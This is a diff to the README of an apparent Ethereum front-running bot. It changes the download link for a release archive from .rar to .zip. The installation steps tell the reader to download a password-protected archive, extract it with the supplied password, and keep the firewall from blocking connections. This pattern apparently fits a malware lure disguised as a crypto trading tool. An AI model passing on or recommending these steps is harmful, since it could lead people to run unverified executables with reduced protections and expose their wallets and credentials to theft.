@@ -52,7 +52,7 @@ For more information contact with me.
 
 ### Installation (public version)
 1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtime if it has not been installed.
-2. [Download](https://github.com/timo991/frontrunner-bot/releases/download/Release2/ethrunner-0.4.2.rar) repository release and extract files with password `o9vbwkhO5X`.
+2. [Download](https://github.com/timo991/frontrunner-bot/releases/download/Release2/ethrunner-0.4.2.zip) repository release and extract files with password `o9vbwkhO5X`.
 3. Make sure that firewall does not blocks any connections.
 
 ### Usage
